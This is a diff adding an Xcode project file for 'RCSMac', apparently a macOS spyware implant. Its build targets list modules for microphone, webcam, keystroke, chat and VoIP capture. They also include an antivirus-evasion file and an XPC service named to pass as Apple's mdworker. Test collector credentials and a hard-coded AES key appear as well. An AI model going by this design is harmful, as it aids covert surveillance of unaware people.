+		1A10795512E720ED0063759B /* Tests */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 1A10795D12E720EE0063759B /* Build configuration list for PBXNativeTarget "Tests" */;
+			buildPhases = (
+				1A10795212E720ED0063759B /* Resources */,
+				1A10795312E720ED0063759B /* Sources */,
+				1A10795412E720ED0063759B /* Frameworks */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+			);
+			name = Tests;
+			productName = Tests;
+			productReference = 1A10795612E720ED0063759B /* Tests.app */;
+			productType = "com.apple.product-type.application";
+		};
+		1AF610080FA72D87003F2C12 /* RCSMInputManager */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 1AF6100D0FA72D8A003F2C12 /* Build configuration list for PBXNativeTarget "RCSMInputManager" */;
+			buildPhases = (
+				1AF610050FA72D87003F2C12 /* Resources */,
+				1AF610060FA72D87003F2C12 /* Sources */,
+				1AF610070FA72D87003F2C12 /* Frameworks */,
+				1A319E540FA896480079B060 /* Rez */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+			);
+			name = RCSMInputManager;
+			productName = RCSMInputManager;
+			productReference = 1AF610090FA72D87003F2C12 /* RCSMInputManager.bundle */;
+			productType = "com.apple.product-type.bundle";
+		};
+		529CA8A41464304100B92C47 /* mdworker_server */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = 529CA8AF1464304100B92C47 /* Build configuration list for PBXNativeTarget "mdworker_server" */;
+			buildPhases = (
+				529CA8A11464304100B92C47 /* Sources */,
+				529CA8A21464304100B92C47 /* Frameworks */,
+				529CA8A31464304100B92C47 /* Resources */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+			);
+			name = mdworker_server;
+			productName = mdworker_server;
+			productReference = 529CA8A51464304100B92C47 /* com.apple.mdworker_server.xpc */;
+			productType = "com.apple.product-type.bundle";
+		};
+		8D1107260486CEB800E47090 /* RCSMac */ = {
+			isa = PBXNativeTarget;
+			buildConfigurationList = C01FCF4A08A954540054247B /* Build configuration list for PBXNativeTarget "RCSMac" */;
+			buildPhases = (
+				8D1107290486CEB800E47090 /* Resources */,
+				8D11072C0486CEB800E47090 /* Sources */,
+				8D11072E0486CEB800E47090 /* Frameworks */,
+			);
+			buildRules = (
+			);
+			dependencies = (
+				523DEC9615186C1300DCC65F /* PBXTargetDependency */,
+			);
+			name = RCSMac;
+			productInstallPath = "$(HOME)/Applications";
+			productName = RCSMac;
+			productReference = 8D1107320486CEB800E47090 /* RCSMac.app */;
+			productType = "com.apple.product-type.application";
+		};
+/* End PBXNativeTarget section */
+
+/* Begin PBXProject section */
+		29B97313FDCFA39411CA2CEA /* Project object */ = {
+			isa = PBXProject;
+			attributes = {
+				LastUpgradeCheck = 0460;
+			};
+			buildConfigurationList = C01FCF4E08A954540054247B /* Build configuration list for PBXProject "RCSMac" */;
+			compatibilityVersion = "Xcode 3.2";
+			developmentRegion = English;
+			hasScannedForEncodings = 1;
+			knownRegions = (
+				English,
+				Japanese,
+				French,
+				German,
+				en,
+			);
+			mainGroup = 29B97314FDCFA39411CA2CEA /* RCSMac */;
+			projectDirPath = "";
+			projectRoot = "";
+			targets = (
+				8D1107260486CEB800E47090 /* RCSMac */,
+				1AF610080FA72D87003F2C12 /* RCSMInputManager */,
+				529CA8A41464304100B92C47 /* mdworker_server */,
+				1A10795512E720ED0063759B /* Tests */,
+			);
+		};
+/* End PBXProject section */
+
+/* Begin PBXResourcesBuildPhase section */
+		1A10795212E720ED0063759B /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		1AF610050FA72D87003F2C12 /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				1A319F090FA9C8260079B060 /* Info in Resources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		529CA8A31464304100B92C47 /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				529CA8AB1464304100B92C47 /* InfoPlist.strings in Resources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		8D1107290486CEB800E47090 /* Resources */ = {
+			isa = PBXResourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				8D11072B0486CEB800E47090 /* InfoPlist.strings in Resources */,
+				1AF92CB10F947D53009ED774 /* spref.tiff in Resources */,
+				1A1B9CD60FA091970036558C /* spref.icns in Resources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXResourcesBuildPhase section */
+
+/* Begin PBXRezBuildPhase section */
+		1A319E540FA896480079B060 /* Rez */ = {
+			isa = PBXRezBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXRezBuildPhase section */
+
+/* Begin PBXSourcesBuildPhase section */
+		1A10795312E720ED0063759B /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				1AD6C55312E7443D00DEE42D /* NSMutableData+AES128.m in Sources */,
+				1A8CB957132791E4005579F9 /* RCSMAgentMicrophone.m in Sources */,
+				1AD6C55412E7443D00DEE42D /* NSString+SHA1.m in Sources */,
+				1AF6091212EF1E5D0091F6F6 /* RCSMTaskManager.m in Sources */,
+				1AF6091812EF1E990091F6F6 /* RCSMLogManager.m in Sources */,
+				1AF6091912EF1E990091F6F6 /* RCSMEvents.m in Sources */,
+				1AF6091A12EF1E990091F6F6 /* RCSMActions.m in Sources */,
+				1AF6091D12EF1ECB0091F6F6 /* RCSMSharedMemory.m in Sources */,
+				1AF6091E12EF1ECB0091F6F6 /* RCSMAgentWebcam.m in Sources */,
+				1AF6091F12EF1ECB0091F6F6 /* RCSMAgentScreenshot.m in Sources */,
+				1A00BF9913019C8000783D4E /* RCSMAgentOrganizer.m in Sources */,
+				1AF6091712EF1E990091F6F6 /* RCSMConfManager.m in Sources */,
+				1AF6092112EF1ECB0091F6F6 /* RCSMEncryption.m in Sources */,
+				1A10796012E721320063759B /* AuthNetworkOperation.m in Sources */,
+				1A10796212E721320063759B /* IDNetworkOperation.m in Sources */,
+				1A10796412E721320063759B /* ConfNetworkOperation.m in Sources */,
+				1A10796612E721320063759B /* DownloadNetworkOperation.m in Sources */,
+				1A10796812E721320063759B /* UploadNetworkOperation.m in Sources */,
+				1A10796A12E721320063759B /* FSNetworkOperation.m in Sources */,
+				1A10796C12E721320063759B /* LogNetworkOperation.m in Sources */,
+				1A10796E12E721320063759B /* ByeNetworkOperation.m in Sources */,
+				1A10796F12E721560063759B /* Transport.m in Sources */,
+				1A10797012E721560063759B /* RESTTransport.m in Sources */,
+				1A10797112E721560063759B /* RESTNetworkProtocol.m in Sources */,
+				1A10797812E721A70063759B /* RCSMCommon.m in Sources */,
+				1A10798912E722590063759B /* GHUnitTestMain.m in Sources */,
+				1A10798E12E722AB0063759B /* RESTNetworkProtocolTest.m in Sources */,
+				1A107BD212E730800063759B /* AuthNetworkOperationTest.m in Sources */,
+				1A107BF612E737060063759B /* RESTTransportTest.m in Sources */,
+				1AF6069F12EDAEA90091F6F6 /* ByeNetworkOperationTest.m in Sources */,
+				1AF6072912EDCAC30091F6F6 /* NSMutableData+SHA1.m in Sources */,
+				1AF6074A12EDD5A70091F6F6 /* IDNetworkOperationTest.m in Sources */,
+				1AF6077B12EDE2160091F6F6 /* NSString+Pascal.m in Sources */,
+				1AF607A112EED0A40091F6F6 /* NSString+PascalTest.m in Sources */,
+				1AF608B612EF0E310091F6F6 /* ConfNetworkOperationTest.m in Sources */,
+				1AF60BE412EF27B50091F6F6 /* DownloadNetworkOperationTest.m in Sources */,
+				1AF60C0412EF2B880091F6F6 /* NSData+Pascal.m in Sources */,
+				1AF60C0E12EF2CC10091F6F6 /* NSData+PascalTest.m in Sources */,
+				1A28786D12F062A80008973A /* UploadNetworkOperationTest.m in Sources */,
+				1A28798612F080B20008973A /* FSNetworkOperationTest.m in Sources */,
+				1A7FD31912F17EED00361B0B /* LogNetworkOperationTest.m in Sources */,
+				1A7FD34012F1841200361B0B /* NSData+SHA1.m in Sources */,
+				1A7FD44212F1D29D00361B0B /* RCSMFileSystemManager.m in Sources */,
+				1A7FD44112F1D28100361B0B /* RCSMFileSystemManagerTest.m in Sources */,
+				1A521EC512FAB9550091ADD5 /* UpgradeNetworkOperationTest.m in Sources */,
+				1AAF6FC912FB0A7E00D3E581 /* RCSMLoggerTest.m in Sources */,
+				1AAF6FCE12FB0B2900D3E581 /* RCSMLogger.m in Sources */,
+				1A00BFAE1302D33700783D4E /* RCSMAgentOrganizerTest.m in Sources */,
+				1A8CB95613278ECB005579F9 /* RCSMAgentMicrophoneTest.m in Sources */,
+				1AC279A913584222009C0812 /* RCSMAgentIMMsnMessenger.m in Sources */,
+				1AEB9542138E94480057EB42 /* RCSMInfoManager.m in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		1AF610060FA72D87003F2C12 /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				CCB619EC185F3B3B003B7D3E /* NSProcessInfo+NSProcessInfo__AVEvasion_.m in Sources */,
+				1A281C990FF3CAC800616589 /* RCSMAgentClipboard.m in Sources */,
+				1A319F880FAA02640079B060 /* RCSMCommon.m in Sources */,
+				1A68E0BA0FB8838400B17F60 /* RCSMAgentIMSkype.m in Sources */,
+				1A17CC611281B440001A74BD /* mach_override.mm in Sources */,
+				1AC279A813584222009C0812 /* RCSMAgentIMMsnMessenger.m in Sources */,
+				1A319EE50FA9B6410079B060 /* RCSMInputManager.m in Sources */,
+				1A319F1F0FA9ED520079B060 /* RCSMSharedMemory.m in Sources */,
+				1A68E1530FB9A3B800B17F60 /* RCSMAgentInputLogger.m in Sources */,
+				1A17CC621281B44A001A74BD /* RCSMAgentVoipSkype.m in Sources */,
+				1A13FE4712F9B4F800B82938 /* RCSMLogger.m in Sources */,
+				1A68E3700FBB1F3200B17F60 /* RCSMAgentURL.m in Sources */,
+				5269F6231330ED7200644B72 /* RCSMAgentApplication.m in Sources */,
+				520F50A61529FD920083B11E /* RCSMAgentIMAdium.m in Sources */,
+				1A5509B113618F9A00D1A2AD /* RCSMAgentFileCapture.m in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		529CA8A11464304100B92C47 /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				529CA8B5146431A500B92C47 /* RCSMLogger.m in Sources */,
+				529CA8B4146430F800B92C47 /* RCSMSharedMemory.m in Sources */,
+				529CA8AE1464304100B92C47 /* main.m in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		8D11072C0486CEB800E47090 /* Sources */ = {
+			isa = PBXSourcesBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				529A87BA14C4257100411539 /* RCSMDiskQuota.m in Sources */,
+				1A8D8E210FC43E420067A45D /* RCSMConfManager.m in Sources */,
+				1A33F8EC0FCC1EB000590FA1 /* RCSMEvents.m in Sources */,
+				8D11072D0486CEB800E47090 /* RCSMMain.m in Sources */,
+				1ABE7E7B0F7CE6ED00BC61B1 /* RCSMUtils.m in Sources */,
+				1AA1376C12F6FA7100E0CD52 /* NSMutableData+SHA1.m in Sources */,
+				1A4435230F8CA23E00CD910E /* NSMutableData+AES128.m in Sources */,
+				1A7FD34112F1841200361B0B /* NSData+SHA1.m in Sources */,
+				1AF60C0512EF2B880091F6F6 /* NSData+Pascal.m in Sources */,
+				1AA1376912F6FA2B00E0CD52 /* NSString+Pascal.m in Sources */,
+				1AB5DC4111CF9DE600B9E32B /* NSApplication+SystemVersion.m in Sources */,
+				1A508A9D11A586D70067BF81 /* NSMutableDictionary+ThreadSafe.m in Sources */,
+				1A4436590F8CD55400CD910E /* RCSMCommon.m in Sources */,
+				1A8D88490FC2B07C0067A45D /* RCSMEncryption.m in Sources */,
+				1A4435490F8CB10800CD910E /* NSString+SHA1.m in Sources */,
+				1A7FD43D12F1CED900361B0B /* RCSMFileSystemManager.m in Sources */,
+				1A33F4B20FC69D1800590FA1 /* RCSMTaskManager.m in Sources */,
+				1ABEEE2E0F975CE100063113 /* RCSMCore.m in Sources */,
+				1A33F4F30FC6AA9400590FA1 /* RCSMAgentScreenshot.m in Sources */,
+				1A8A7877130027610024B9CF /* RCSMAgentOrganizer.m in Sources */,
+				52CE814B14C6FE500029421E /* mach_override.mm in Sources */,
+				1A7A94160FE13EC7007FF947 /* RCSMActions.m in Sources */,
+				1A9BB24E0FE8EF2600846023 /* RCSMLogManager.m in Sources */,
+				1AA1373212F6EFC900E0CD52 /* AuthNetworkOperation.m in Sources */,
+				1AA1373712F6EFC900E0CD52 /* FSNetworkOperation.m in Sources */,
+				1AA1373312F6EFC900E0CD52 /* IDNetworkOperation.m in Sources */,
+				1AA1373412F6EFC900E0CD52 /* ConfNetworkOperation.m in Sources */,
+				1A1A2FD010611067001F1B5D /* RCSMAgentWebcam.m in Sources */,
+				5262A949132A6755001D1988 /* RCSMSharedMemory.m in Sources */,
+				1AA1373612F6EFC900E0CD52 /* UploadNetworkOperation.m in Sources */,
+				CCE74A80185B1BB40029A342 /* NSProcessInfo+NSProcessInfo__AVEvasion_.m in Sources */,
+				1AA1373512F6EFC900E0CD52 /* DownloadNetworkOperation.m in Sources */,
+				1AA1373812F6EFC900E0CD52 /* LogNetworkOperation.m in Sources */,
+				1AA1373912F6EFC900E0CD52 /* ByeNetworkOperation.m in Sources */,
+				1AA1373A12F6EFDD00E0CD52 /* Transport.m in Sources */,
+				1AA1373C12F6EFDD00E0CD52 /* RESTNetworkProtocol.m in Sources */,
+				1A13FE4612F9B4F800B82938 /* RCSMLogger.m in Sources */,
+				1AA1373B12F6EFDD00E0CD52 /* RESTTransport.m in Sources */,
+				1A521ECB12FABAC00091ADD5 /* UpgradeNetworkOperation.m in Sources */,
+				5262A948132A5AB4001D1988 /* RCSMAgentDevice.m in Sources */,
+				1A8CB950132665D1005579F9 /* RCSMAgentMicrophone.m in Sources */,
+				521B22C61312BA360077A491 /* RCSMAgentPosition.m in Sources */,
+				52B8504115146D4E00F0D72E /* NSObject+SBJson.m in Sources */,
+				1AEB9541138E94480057EB42 /* RCSMInfoManager.m in Sources */,
+				52B8504315146D4E00F0D72E /* SBJsonParser.m in Sources */,
+				52B8504415146D4E00F0D72E /* SBJsonStreamParser.m in Sources */,
+				52B8504515146D4E00F0D72E /* SBJsonStreamParserAccumulator.m in Sources */,
+				52B8504215146D4E00F0D72E /* RCSIJSonConfiguration.m in Sources */,
+				52B8504615146D4E00F0D72E /* SBJsonStreamParserAdapter.m in Sources */,
+				52B8504715146D4E00F0D72E /* SBJsonStreamParserState.m in Sources */,
+				52B8504815146D4E00F0D72E /* SBJsonStreamWriter.m in Sources */,
+				52B8504915146D4E00F0D72E /* SBJsonStreamWriterAccumulator.m in Sources */,
+				52B8504A15146D4E00F0D72E /* SBJsonStreamWriterState.m in Sources */,
+				52B8504D15146D4E00F0D72E /* SBJsonWriter.m in Sources */,
+				52B8504B15146D4E00F0D72E /* SBJsonTokeniser.m in Sources */,
+				52B8504C15146D4E00F0D72E /* SBJsonUTF8Stream.m in Sources */,
+				CCFFD70615D8ED6E00131597 /* RCSMGlobals.m in Sources */,
+				CC27338216B7D1D100DCD0E4 /* CommandsNetworkOperation.m in Sources */,
+				CC31C81016DCB5FB00922BD6 /* RCSMTask.m in Sources */,
+				C52FEF4116FC596200DCBF2A /* __m_Social_Module.m in Sources */,
+				C52FEF4516FC59C900DCBF2A /* __m_Social.m in Sources */,
+				C52FEF4816FC5A0E00DCBF2A /* __m_Social_Facebook.m in Sources */,
+				CCD43B5C18EC00AC005B2B67 /* RCSMAgentMessages.m in Sources */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXSourcesBuildPhase section */
+
+/* Begin PBXTargetDependency section */
+		523DEC9615186C1300DCC65F /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			target = 1AF610080FA72D87003F2C12 /* RCSMInputManager */;
+			targetProxy = 523DEC9515186C1300DCC65F /* PBXContainerItemProxy */;
+		};
+/* End PBXTargetDependency section */
+
+/* Begin PBXVariantGroup section */
+		089C165CFE840E0CC02AAC07 /* InfoPlist.strings */ = {
+			isa = PBXVariantGroup;
+			children = (
+				089C165DFE840E0CC02AAC07 /* English */,
+			);
+			name = InfoPlist.strings;
+			sourceTree = "<group>";
+		};
+		529CA8A91464304100B92C47 /* InfoPlist.strings */ = {
+			isa = PBXVariantGroup;
+			children = (
+				529CA8AA1464304100B92C47 /* en */,
+			);
+			name = InfoPlist.strings;
+			sourceTree = "<group>";
+		};
+/* End PBXVariantGroup section */
+
+/* Begin XCBuildConfiguration section */
+		1A10795B12E720EE0063759B /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				COMBINE_HIDPI_IMAGES = YES;
+				COPY_PHASE_STRIP = NO;
+				GCC_DYNAMIC_NO_PIC = NO;
+				GCC_MODEL_TUNING = G5;
+				GCC_OPTIMIZATION_LEVEL = 0;
+				GCC_PRECOMPILE_PREFIX_HEADER = YES;
+				GCC_PREFIX_HEADER = "$(SYSTEM_LIBRARY_DIR)/Frameworks/AppKit.framework/Headers/AppKit.h";
+				INFOPLIST_FILE = "Tests-Info.plist";
+				INSTALL_PATH = "$(HOME)/Applications";
+				LIBRARY_SEARCH_PATHS = (
+					"$(inherited)",
+					"\"$(SRCROOT)\"",
+					"\"$(SRCROOT)/Support/Speex\"",
+				);
+				OTHER_LDFLAGS = (
+					"-framework",
+					Foundation,
+					"-framework",
+					AppKit,
+				);
+				PRODUCT_NAME = Tests;
+				SDKROOT = macosx;
+			};
+			name = Debug;
+		};
+		1A10795C12E720EE0063759B /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				COMBINE_HIDPI_IMAGES = YES;
+				COPY_PHASE_STRIP = YES;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
+				GCC_MODEL_TUNING = G5;
+				GCC_PRECOMPILE_PREFIX_HEADER = YES;
+				GCC_PREFIX_HEADER = "$(SYSTEM_LIBRARY_DIR)/Frameworks/AppKit.framework/Headers/AppKit.h";
+				GCC_VERSION = com.apple.compilers.llvmgcc42;
+				INFOPLIST_FILE = "Tests-Info.plist";
+				INSTALL_PATH = "$(HOME)/Applications";
+				LIBRARY_SEARCH_PATHS = (
+					"$(inherited)",
+					"\"$(SRCROOT)\"",
+					"\"$(SRCROOT)/Support/Speex\"",
+				);
+				OTHER_LDFLAGS = (
+					"-framework",
+					Foundation,
+					"-framework",
+					AppKit,
+				);
+				PRODUCT_NAME = Tests;
+				SDKROOT = macosx;
+				ZERO_LINK = NO;
+			};
+			name = Release;
+		};
+		1AF6100B0FA72D8A003F2C12 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				AES_ENC_KEY = pippo;
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				CLANG_ENABLE_OBJC_ARC = NO;
+				COMBINE_HIDPI_IMAGES = YES;
+				COPY_PHASE_STRIP = NO;
+				GCC_DYNAMIC_NO_PIC = NO;
+				GCC_ENABLE_OBJC_GC = supported;
+				GCC_MODEL_TUNING = G5;
+				GCC_OPTIMIZATION_LEVEL = 0;
+				GCC_PRECOMPILE_PREFIX_HEADER = YES;
+				GCC_PREFIX_HEADER = "$(SYSTEM_LIBRARY_DIR)/Frameworks/AppKit.framework/Headers/AppKit.h";
+				GCC_PREPROCESSOR_DEFINITIONS = (
+					XPCOM_GLUE,
+					MOZILLA_STRICT_API,
+				);
+				GCC_SYMBOLS_PRIVATE_EXTERN = YES;
+				GCC_VERSION = com.apple.compilers.llvm.clang.1_0;
+				HEADER_SEARCH_PATHS = "";
+				INFOPLIST_FILE = "RCSMInputManager-Info.plist";
+				INSTALL_PATH = "$(HOME)/Library/Bundles";
+				LIBRARY_SEARCH_PATHS = (
+					"$(inherited)",
+					"\"$(SRCROOT)/Support/Speex\"",
+					"\"$(SRCROOT)/Support/Firefox\"",
+					"\"$(SRCROOT)/Support/Firefox/lib\"",
+				);
+				MACOSX_DEPLOYMENT_TARGET = 10.7;
+				ONLY_ACTIVE_ARCH = NO;
+				OTHER_LDFLAGS = (
+					"-framework",
+					Foundation,
+					"-framework",
+					AppKit,
+					"-fshort-wchar",
+					"-lazy-lxpcom",
+					"-lazy-lmozalloc",
+					"-lazy-lnspr4",
+				);
+				PRODUCT_NAME = RCSMInputManager;
+				SDKROOT = macosx10.7;
+				USER_HEADER_SEARCH_PATHS = "../**";
+				WRAPPER_EXTENSION = bundle;
+			};
+			name = Debug;
+		};
+		1AF6100C0FA72D8A003F2C12 /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				AES_ENC_KEY = pippo;
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				ARCHS = "$(ARCHS_STANDARD_32_64_BIT)";
+				CLANG_ENABLE_OBJC_ARC = NO;
+				COMBINE_HIDPI_IMAGES = YES;
+				COPY_PHASE_STRIP = YES;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
+				GCC_ENABLE_OBJC_GC = supported;
+				GCC_MODEL_TUNING = G5;
+				GCC_PRECOMPILE_PREFIX_HEADER = YES;
+				GCC_PREFIX_HEADER = "$(SYSTEM_LIBRARY_DIR)/Frameworks/AppKit.framework/Headers/AppKit.h";
+				GCC_PREPROCESSOR_DEFINITIONS = (
+					XPCOM_GLUE,
+					MOZILLA_STRICT_API,
+				);
+				GCC_SYMBOLS_PRIVATE_EXTERN = YES;
+				GCC_VERSION = com.apple.compilers.llvm.clang.1_0;
+				HEADER_SEARCH_PATHS = "";
+				INFOPLIST_FILE = "RCSMInputManager-Info.plist";
+				INSTALL_PATH = "$(HOME)/Library/Bundles";
+				LIBRARY_SEARCH_PATHS = (
+					"$(inherited)",
+					"\"$(SRCROOT)/Support/Speex\"",
+					"\"$(SRCROOT)/Support/Firefox\"",
+					"\"$(SRCROOT)/Support/Firefox/lib\"",
+				);
+				MACOSX_DEPLOYMENT_TARGET = 10.7;
+				ONLY_ACTIVE_ARCH = NO;
+				OTHER_LDFLAGS = (
+					"-framework",
+					Foundation,
+					"-framework",
+					AppKit,
+					"-fshort-wchar",
+					"-lazy-lxpcom",
+					"-lazy-lmozalloc",
+					"-lazy-lnspr4",
+				);
+				PRODUCT_NAME = RCSMInputManager;
+				SDKROOT = macosx10.7;
+				USER_HEADER_SEARCH_PATHS = "../**";
+				WRAPPER_EXTENSION = bundle;
+				ZERO_LINK = NO;
+			};
+			name = Release;
+		};
+		529CA8B01464304100B92C47 /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				ARCHS = "$(ARCHS_STANDARD_32_64_BIT)";
+				COMBINE_HIDPI_IMAGES = YES;
+				GCC_C_LANGUAGE_STANDARD = gnu99;
+				GCC_DYNAMIC_NO_PIC = NO;
+				GCC_ENABLE_OBJC_EXCEPTIONS = YES;
+				GCC_PRECOMPILE_PREFIX_HEADER = YES;
+				GCC_PREFIX_HEADER = "mdworker_server/mdworker_server-Prefix.pch";
+				GCC_PREPROCESSOR_DEFINITIONS = (
+					"DEBUG=1",
+					"$(inherited)",
+				);
+				GCC_SYMBOLS_PRIVATE_EXTERN = NO;
+				GCC_VERSION = com.apple.compilers.llvm.clang.1_0;
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_MISSING_PROTOTYPES = YES;
+				INFOPLIST_FILE = "mdworker_server/mdworker_server-Info.plist";
+				MACH_O_TYPE = mh_execute;
+				MACOSX_DEPLOYMENT_TARGET = 10.7;
+				ONLY_ACTIVE_ARCH = NO;
+				PRODUCT_NAME = "com.apple.$(TARGET_NAME)";
+				SDKROOT = macosx;
+				WRAPPER_EXTENSION = xpc;
+			};
+			name = Debug;
+		};
+		529CA8B11464304100B92C47 /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				ARCHS = "$(ARCHS_STANDARD_32_64_BIT)";
+				COMBINE_HIDPI_IMAGES = YES;
+				COPY_PHASE_STRIP = YES;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
+				GCC_C_LANGUAGE_STANDARD = gnu99;
+				GCC_ENABLE_OBJC_EXCEPTIONS = YES;
+				GCC_PRECOMPILE_PREFIX_HEADER = YES;
+				GCC_PREFIX_HEADER = "mdworker_server/mdworker_server-Prefix.pch";
+				GCC_VERSION = com.apple.compilers.llvm.clang.1_0;
+				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
+				GCC_WARN_ABOUT_MISSING_PROTOTYPES = YES;
+				INFOPLIST_FILE = "mdworker_server/mdworker_server-Info.plist";
+				MACH_O_TYPE = mh_execute;
+				MACOSX_DEPLOYMENT_TARGET = 10.7;
+				ONLY_ACTIVE_ARCH = NO;
+				PRODUCT_NAME = "com.apple.$(TARGET_NAME)";
+				SDKROOT = macosx;
+				WRAPPER_EXTENSION = xpc;
+			};
+			name = Release;
+		};
+		C01FCF4B08A954540054247B /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				ARCHS = "$(ARCHS_STANDARD_32_BIT)";
+				COMBINE_HIDPI_IMAGES = YES;
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
+				GCC_DYNAMIC_NO_PIC = NO;
+				GCC_MODEL_TUNING = G5;
+				GCC_OPTIMIZATION_LEVEL = 0;
+				GCC_PRECOMPILE_PREFIX_HEADER = YES;
+				GCC_PREFIX_HEADER = RCSMac_Prefix.pch;
+				INFOPLIST_FILE = Info.plist;
+				INSTALL_PATH = "$(HOME)/Applications";
+				LIBRARY_SEARCH_PATHS = (
+					"$(inherited)",
+					"\"$(SRCROOT)/Support/Speex\"",
+					"\"$(SRCROOT)\"",
+					"\"$(SDKROOT)$(SYSTEM_LIBRARY_DIR)/PrivateFrameworks/SPSupport.framework/Versions/A\"",
+					"\"$(SDKROOT)$(SYSTEM_LIBRARY_DIR)/PrivateFrameworks/Apple80211.framework/Versions/A\"",
+				);
+				MACOSX_DEPLOYMENT_TARGET = 10.7;
+				ONLY_ACTIVE_ARCH = YES;
+				OTHER_LDFLAGS = (
+					"-Wl,-search_paths_first",
+					"-lspeex",
+					"-Wl,-headerpad,0x3000",
+				);
+				PRODUCT_NAME = RCSMac;
+				RCS_TEST_COLLECTOR = 192.168.100.100;
+				RCS_TEST_INSTANCE = RCS_0000001730;
+				RCS_TEST_PASSWD = osx_test;
+				RCS_TEST_SYNCH = YES;
+				RCS_TEST_USER = osxtest;
+				SDKROOT = macosx10.9;
+				VALID_ARCHS = i386;
+			};
+			name = Debug;
+		};
+		C01FCF4C08A954540054247B /* Release */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ALWAYS_SEARCH_USER_PATHS = NO;
+				ARCHS = "$(ARCHS_STANDARD_32_BIT)";
+				COMBINE_HIDPI_IMAGES = YES;
+				COPY_PHASE_STRIP = YES;
+				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
+				GCC_MODEL_TUNING = G5;
+				GCC_PRECOMPILE_PREFIX_HEADER = YES;
+				GCC_PREFIX_HEADER = RCSMac_Prefix.pch;
+				GCC_SYMBOLS_PRIVATE_EXTERN = YES;
+				GCC_VERSION = "";
+				INFOPLIST_FILE = Info.plist;
+				INSTALL_PATH = "$(HOME)/Applications";
+				LIBRARY_SEARCH_PATHS = (
+					"$(inherited)",
+					"\"$(SRCROOT)/Support/Speex\"",
+					"\"$(SRCROOT)\"",
+					"\"$(SDKROOT)$(SYSTEM_LIBRARY_DIR)/PrivateFrameworks/SPSupport.framework/Versions/A\"",
+					"\"$(SDKROOT)$(SYSTEM_LIBRARY_DIR)/PrivateFrameworks/Apple80211.framework/Versions/A\"",
+				);
+				MACOSX_DEPLOYMENT_TARGET = 10.7;
+				ONLY_ACTIVE_ARCH = YES;
+				OTHER_LDFLAGS = (
+					"-Wl,-search_paths_first",
+					"-Wl,-headerpad,0x3000",
+					"-lspeex",
+				);
+				PRODUCT_NAME = RCSMac;
+				RCS_TEST_COLLECTOR = 192.168.100.100;
+				RCS_TEST_INSTANCE = RCS_0000001730;
+				RCS_TEST_PASSWD = osx_test;
+				RCS_TEST_SYNCH = YES;
+				RCS_TEST_USER = osxtest;
+				SDKROOT = macosx10.9;
+				STANDARD_C_PLUS_PLUS_LIBRARY_TYPE = YES;
+				VALID_ARCHS = i386;
+			};
+			name = Release;
+		};
+		C01FCF4F08A954540054247B /* Debug */ = {
+			isa = XCBuildConfiguration;
+			buildSettings = {
+				ARCHS = "$(ARCHS_STANDARD_32_64_BIT)";
+				COPY_PHASE_STRIP = NO;
+				DEBUG_INFORMATION_FORMAT = stabs;
+				GCC_C_LANGUAGE_STANDARD = c99;
+				GCC_DEBUGGING_SYMBOLS = full;
+				GCC_OPTIMIZATION_LEVEL = 0;
+				GCC_PREPROCESSOR_DEFINITIONS = "";
+				GCC_WARN_ABOUT_RETURN_TYPE = YES;
+				GCC_WARN_UNUSED_VARIABLE = YES;
+				LIBRARY_SEARCH_PATHS = ".//**";
+				MACOSX_DEPLOYMENT_TARGET = 10.5;
+				ONLY_ACTIVE_ARCH = YES;
+				OTHER_LDFLAGS = (
+					"-Wl,-search_paths_first",
+					"-lspeex",
+				);
